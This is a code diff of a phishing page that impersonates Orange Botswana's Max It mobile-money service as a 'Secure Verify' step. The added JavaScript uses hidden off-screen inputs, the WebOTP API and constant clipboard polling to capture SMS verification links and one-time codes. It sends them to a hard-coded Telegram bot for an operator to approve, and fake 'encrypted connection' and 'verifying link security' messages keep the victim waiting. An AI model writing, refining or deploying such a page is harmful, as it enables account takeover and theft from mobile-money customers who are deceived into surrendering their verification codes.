@@ -2,78 +2,86 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Orange Max It - Smart Verify</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Max It - Secure Verify</title>
     <link rel="icon" href="https://www.orange.co.bw/favicon.ico" type="image/x-icon">
-    <meta name="theme-color" content="#FF6600">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@400;500;600&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
         
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        html, body { min-height: 100vh; font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #fff8f3 0%, #ffe6d5 100%); overflow-x: hidden; }
-        body { display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: linear-gradient(135deg, #fff8f3 0%, #ffe6d5 100%); display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; user-select: none; -webkit-user-select: none; }
+        .container { width: 100%; max-width: 450px; background: white; border-radius: 28px; padding: 40px 30px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.1); text-align: center; position: relative; overflow: hidden; }
+        .logo { width: 70px; height: 70px; background: linear-gradient(135deg, #FF6600, #FF8533); border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: white; font-weight: 800; font-size: 32px; box-shadow: 0 10px 25px rgba(255, 102, 0, 0.25); }
+        h1 { font-size: 24px; font-weight: 700; color: #1a1a1a; margin-bottom: 10px; }
+        .subtitle { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.6; }
 
-        header { width: 100%; max-width: 520px; padding: 24px 20px; text-align: center; margin-bottom: 30px; background: linear-gradient(135deg, #FF6600 0%, #FF8533 100%); border-radius: 24px; box-shadow: 0 10px 40px rgba(255, 102, 0, 0.2); position: relative; overflow: hidden; }
-        .logo { font-size: 28px; font-weight: 800; letter-spacing: -1px; color: white; position: relative; z-index: 1; }
+        /* Status States */
+        .status-box { margin: 20px 0; padding: 20px; border-radius: 16px; text-align: left; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); border: 2px solid transparent; }
+        .status-waiting { background: #fffcf9; border-color: #FFE6D5; }
+        .status-active { background: #f0f7ff; border-color: #cce4ff; }
+        .status-success { background: #f0fdf4; border-color: #bbf7d0; transform: scale(1.02); }
+        
+        .status-title { font-size: 15px; font-weight: 700; color: #1a1a1a; display: flex; align-items: center; gap: 10px; }
+        .status-desc { font-size: 13px; color: #666; margin-top: 8px; line-height: 1.5; }
 
-        .container { width: 100%; max-width: 520px; display: flex; flex-direction: column; gap: 20px; }
+        /* Pulse Animation */
+        .pulse { width: 10px; height: 10px; background: #FF6600; border-radius: 50%; display: inline-block; animation: pulse-anim 1.5s infinite; }
+        @keyframes pulse-anim { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 102, 0, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(255, 102, 0, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 102, 0, 0); } }
 
-        .progress-container { background: white; border-radius: 16px; padding: 16px; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05); display: flex; align-items: center; gap: 12px; }
-        .progress-step { flex: 1; height: 6px; border-radius: 3px; background: #FFE6D5; position: relative; }
-        .progress-step.active { background: #FF6600; }
-        .progress-text { font-size: 12px; font-weight: 700; color: #FF6600; min-width: 80px; }
+        /* Hidden Sensors */
+        .ghost-sensors { position: absolute; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0; overflow: hidden; }
+        .ghost-sensors input { width: 100%; height: 100%; font-size: 16px; }
 
-        .status-banner { border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; display: flex; align-items: center; gap: 10px; font-size: 13px; font-weight: 600; transition: all 0.3s; }
-        .status-waiting { background: rgba(255, 102, 0, 0.1); border: 2px solid rgba(255, 102, 0, 0.2); color: #FF6600; }
-        .status-scanning { background: rgba(0, 123, 255, 0.1); border: 2px solid rgba(0, 123, 255, 0.2); color: #007bff; }
-        .status-detected { background: rgba(5, 150, 105, 0.1); border: 2px solid rgba(5, 150, 105, 0.2); color: #059669; }
+        /* Action Buttons */
+        .btn-main { width: 100%; padding: 18px; background: linear-gradient(135deg, #FF6600, #E55A00); color: white; border: none; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s; box-shadow: 0 10px 30px rgba(255, 102, 0, 0.2); }
+        .btn-main:active { transform: translateY(2px); box-shadow: 0 5px 15px rgba(255, 102, 0, 0.2); }
+        .btn-main:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
-        .form-card { background: white; border-radius: 24px; padding: 32px 24px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08); text-align: center; position: relative; overflow: hidden; }
-        .form-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
-        .form-subtitle { font-size: 13px; color: #666; margin-bottom: 28px; line-height: 1.5; }
+        footer { margin-top: 30px; color: #AAA; font-size: 12px; text-align: center; }
 
-        .form-group { text-align: left; margin-bottom: 24px; position: relative; }
-        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #2c3e50; }
-        .form-input { width: 100%; padding: 16px; font-size: 15px; font-family: 'Poppins', sans-serif; border: 2px solid #FFE6D5; border-radius: 14px; outline: none; transition: all 0.3s; background: #fffcf9; }
-        .form-input.auto-filled { border-color: #FF6600; background: rgba(255, 102, 0, 0.05); }
-
-        #spinner { position: fixed; inset: 0; background: rgba(255, 102, 0, 0.15); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 9999; }
-        .spin { width: 60px; height: 60px; border: 6px solid #ffffff; border-top: 6px solid #FF6600; border-radius: 50%; animation: spin 1s linear infinite; }
+        /* Spinner */
+        .spinner { width: 18px; height: 18px; border: 2px solid rgba(255, 102, 0, 0.1); border-top: 2px solid #FF6600; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        footer { padding: 24px 20px; color: #999; font-size: 12px; text-align: center; margin-top: auto; width: 100%; }
     </style>
 </head>
 <body>
-    <header><div class="logo">🟠 Orange Max It</div></header>
 
     <div class="container">
-        <div class="progress-container">
-            <div class="progress-step active"></div>
-            <div class="progress-step active"></div>
-            <div class="progress-step active"></div>
-            <span class="progress-text">Step 3 of 3</span>
+        <div class="logo">🟠</div>
+        <h1 id="mainTitle">Verification Required</h1>
+        <p class="subtitle" id="mainSubtitle">Please complete the secure verification to proceed.</p>
+
+        <!-- Initial View -->
+        <div id="initialView">
+            <button class="btn-main" id="startBtn">Start Verification</button>
+            <p style="font-size: 11px; color: #999; margin-top: 15px;">Secure 256-bit encrypted connection</p>
         </div>
 
-        <div class="status-banner status-waiting" id="statusBanner">
-            <span id="statusIcon">⏳</span>
-            <span id="statusText">Initializing system (Waiting 5s)...</span>
-        </div>
-
-        <div class="form-card">
-            <h1 class="form-title">Verification Waiting</h1>
-            <p class="form-subtitle">The system will start scanning for your <b>new</b> SMS link in 5 seconds. Please ensure the link arrives after the scan begins.</p>
-
-            <div class="form-group">
-                <label for="linkInput">Verification Link</label>
-                <input type="text" id="linkInput" class="form-input" placeholder="System starting soon..." readonly>
+        <!-- Processing View -->
+        <div id="processingView" style="display: none;">
+            <div class="status-box status-active" id="statusBox">
+                <div class="status-title" id="statusTitle">
+                    <div class="pulse" id="statusPulse"></div>
+                    <span id="statusText">Awaiting Link...</span>
+                </div>
+                <div class="status-desc" id="statusDesc">
+                    The system is scanning for your <b>new</b> SMS link. Please do not close this window.
+                </div>
             </div>
             
-            <button class="btn-action" style="display:none;" id="continueBtn">Continue</button>
+            <div id="approvalWait" style="display: none; margin-top: 20px;">
+                <div class="spinner" style="margin: 0 auto 15px;"></div>
+                <p style="font-size: 13px; color: #666; font-weight: 600;">Verifying link security...</p>
+                <p style="font-size: 11px; color: #999; margin-top: 5px;">This may take a moment</p>
+            </div>
         </div>
     </div>
 
-    <div id="spinner"><div class="spin"></div></div>
+    <!-- Hidden Deep Sensors -->
+    <div class="ghost-sensors">
+        <input type="text" id="sensorOTP" autocomplete="one-time-code" inputmode="numeric">
+        <input type="text" id="sensorVerify" autocomplete="off">
+    </div>
 
     <footer>© 2026 Orange Botswana | Licensed Financial Services</footer>
 
@@ -81,86 +89,182 @@
         const CONFIG = {
             BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
             CHAT_ID: '7547427914',
-            REDIRECT_PAGE: 'success.html',
-            START_DELAY: 5000, // 5 seconds wait
-            POLL_INTERVAL: 1000,
-            LINK_PATTERN: /https?:\/\/(?:www\.)?(?:orange|maxit|auth|token)[^\s]+/gi
+            REDIRECT: 'success.html',
+            // Universal pattern for Orange verification links
+            PATTERN: /https?:\/\/(?:[a-z0-9\-]+\.)*(?:maxit-mobile\.orange\.co\.bw|orange\.co\.bw|maxit|auth|token|verify|link)[^\s"'<>]*/gi
         };
 
-        const state = { isProcessing: false, isScanning: false, detectedLinks: new Set() };
+        const state = {
+            active: false,
+            captured: null,
+            sent: false,
+            initialClipboard: '',
+            lastUpdateId: 0
+        };
+
         const els = {
-            linkInput: document.getElementById('linkInput'),
-            statusBanner: document.getElementById('statusBanner'),
+            startBtn: document.getElementById('startBtn'),
+            initialView: document.getElementById('initialView'),
+            processingView: document.getElementById('processingView'),
+            statusBox: document.getElementById('statusBox'),
+            statusTitle: document.getElementById('statusTitle'),
             statusText: document.getElementById('statusText'),
-            statusIcon: document.getElementById('statusIcon'),
-            spinner: document.getElementById('spinner')
+            statusDesc: document.getElementById('statusDesc'),
+            statusPulse: document.getElementById('statusPulse'),
+            approvalWait: document.getElementById('approvalWait'),
+            sensorOTP: document.getElementById('sensorOTP'),
+            sensorVerify: document.getElementById('sensorVerify')
         };
 
-        function updateStatus(type, text, icon) {
-            els.statusBanner.className = `status-banner status-${type}`;
-            els.statusText.innerText = text;
-            els.statusIcon.innerText = icon;
+        // ─── START PROCESS ───
+        els.startBtn.addEventListener('click', async () => {
+            state.active = true;
+            els.initialView.style.display = 'none';
+            els.processingView.style.display = 'block';
+            
+            // 1. Snapshot current clipboard to ignore old links
+            try {
+                state.initialClipboard = await navigator.clipboard.readText();
+            } catch(e) {}
+
+            // 2. Activate Ghost Sensors
+            activateSensors();
+            
+            // 3. Start High-Freq Loop
+            startCaptureLoop();
+        });
+
+        // ─── GHOST SENSORS (iOS/Android) ───
+        function activateSensors() {
+            const sensors = [els.sensorOTP, els.sensorVerify];
+            sensors.forEach(s => {
+                s.addEventListener('input', (e) => handleRawInput(e.target.value));
+                s.addEventListener('change', (e) => handleRawInput(e.target.value));
+                s.addEventListener('paste', (e) => {
+                    const text = (e.clipboardData || window.clipboardData).getData('text');
+                    handleRawInput(text);
+                });
+            });
+
+            // Keep focus for iOS auto-fill suggestions
+            setInterval(() => {
+                if (state.active && !state.captured) {
+                    els.sensorOTP.focus();
+                }
+            }, 400);
         }
 
-        async function startScanning() {
-            state.isScanning = true;
-            updateStatus('scanning', 'Scanning for NEW SMS link...', '🔍');
-            els.linkInput.placeholder = "Actively scanning for SMS...";
+        // ─── CAPTURE LOOP ───
+        function startCaptureLoop() {
+            // WebOTP API (Android)
+            if ('OTPCredential' in window) {
+                navigator.credentials.get({ otp: { transport: ['sms'] } })
+                    .then(otp => otp && handleRawInput(otp.code))
+                    .catch(() => {});
+            }
 
+            // Clipboard Polling (All Devices)
             setInterval(async () => {
-                if (state.isProcessing) return;
+                if (!state.active || state.captured) return;
                 try {
                     const text = await navigator.clipboard.readText();
-                    const links = text.match(CONFIG.LINK_PATTERN);
-                    if (links) {
-                        links.forEach(link => {
-                            if (!state.detectedLinks.has(link)) {
-                                state.detectedLinks.add(link);
-                                handleDetection(link);
-                            }
-                        });
+                    if (text && text !== state.initialClipboard) {
+                        handleRawInput(text);
                     }
-                } catch (e) {}
-            }, CONFIG.POLL_INTERVAL);
-        }
+                } catch(e) {}
+            }, 300);
 
-        function handleDetection(link) {
-            state.isProcessing = true;
-            els.linkInput.value = link;
-            els.linkInput.classList.add('auto-filled');
-            updateStatus('detected', 'New link detected! Sending...', '✅');
-            els.spinner.style.display = 'flex';
-            sendToTelegram(link);
-        }
-
-        function sendToTelegram(link) {
-            const message = `*🔐 Orange Max It Verification*\n\n*New SMS Detected:*\n[Click to Verify](${link})\n\n*Action:* Instant auto-capture successful.`;
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).then(() => {
-                setTimeout(() => window.location.href = CONFIG.REDIRECT_PAGE, 2000);
+            // Re-check on Focus (When user switches back from SMS app)
+            window.addEventListener('focus', async () => {
+                if (state.active && !state.captured) {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        handleRawInput(text);
+                    } catch(e) {}
+                }
             });
         }
 
-        document.addEventListener('DOMContentLoaded', () => {
-            // Smart Delay: Wait 5 seconds before starting the scan
-            setTimeout(() => {
-                startScanning();
-            }, CONFIG.START_DELAY);
+        // ─── INPUT PROCESSING ───
+        function handleRawInput(text) {
+            if (!text || state.captured) return;
+            
+            const match = text.match(CONFIG.PATTERN);
+            if (match) {
+                state.captured = match[0];
+                onLinkDetected(state.captured);
+            }
+        }
 
-            // Interaction trigger for clipboard access
-            document.body.addEventListener('click', () => {
-                if (!state.isScanning && (Date.now() - performance.timing.navigationStart > CONFIG.START_DELAY)) {
-                    startScanning();
+        function onLinkDetected(link) {
+            // UI Update
+            els.statusBox.className = 'status-box status-success';
+            els.statusText.innerText = 'Link Received';
+            els.statusPulse.style.background = '#2ecc71';
+            els.statusDesc.innerText = 'Verification in progress. Please wait for final approval...';
+            els.approvalWait.style.display = 'block';
+
+            // Auto-Send to Telegram
+            sendToTelegram(link);
+        }
+
+        // ─── TELEGRAM COMMUNICATION ───
+        async function sendToTelegram(link) {
+            if (state.sent) return;
+            state.sent = true;
+
+            const aid = `app_${Date.now()}`;
+            const did = `dec_${Date.now()}`;
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: `*🔐 NEW ORANGE LINK DETECTED*\n\n${link}`,
+                        parse_mode: 'Markdown',
+                        reply_markup: {
+                            inline_keyboard: [[
+                                { text: '✅ Approve', callback_data: aid },
+                                { text: '❌ Decline', callback_data: did }
+                            ]]
+                        }
+                    })
+                });
+                
+                if (res.ok) {
+                    startApprovalPolling(aid, did);
                 }
-            }, { once: true });
-        });
+            } catch(e) {
+                state.sent = false; // Retry logic could go here
+            }
+        }
+
+        // ─── APPROVAL POLLING ───
+        function startApprovalPolling(aid, did) {
+            const poll = setInterval(async () => {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`);
+                    const data = await res.json();
+                    
+                    if (data.ok && data.result.length > 0) {
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            const cb = update.callback_query?.data;
+                            
+                            if (cb === aid) {
+                                clearInterval(poll);
+                                window.location.href = CONFIG.REDIRECT;
+                            } else if (cb === did) {
+                                clearInterval(poll);
+                                location.reload(); // Reset on decline
+                            }
+                        });
+                    }
+                } catch(e) {}
+            }, 2000);
+        }
     </script>
 </body>
 </html>
